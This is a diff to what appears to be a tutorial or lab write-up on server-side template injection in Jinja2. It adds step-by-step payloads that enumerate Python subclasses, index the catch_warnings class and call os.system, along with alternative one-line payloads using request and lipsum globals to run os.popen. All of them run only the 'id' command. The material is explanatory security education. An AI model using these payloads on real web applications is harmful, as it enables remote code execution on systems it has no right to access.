@@ -43,11 +43,26 @@ We can replicate the steps above to achieve RCE using custom payload in Jinja te
 ```python
 {{ ''.__class__.__mro__ }}
 ```
-2. Once confirmed, show all subclasses.
+2. Once confirmed, show all subclasses or retrieve the total number of subclasses
 ```python
 {{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__.__mro__[1].__subclasses__()|length }}
 ```
 3. To make step 2 easier, we can just craft a for loop to put index on all subclasses.
 ```python
-{% for i in range() %}
+{% for i in range(454) %} {{i}} {{''.__class__.__mro__[1].__subclasses__()[i].__name__}} {% endfor %}
+
+# Note: The value of range() should be the total length of subclasses.
+```
+4. Again, we will be looking for `catch_warnings` subclass. Once we have identified its index number, we can now craft our final payload to achieve RCE.
+```python
+{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system('id')}}
+```
+
+Additionally, we can also use specific Jinja2's specific functions to exploit SSTI vulnerabilities. These are the `request` and `lipsum`:
+```python
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
+```python
+{{lipsum.__globals__.os.popen('id').read()}}
 ```
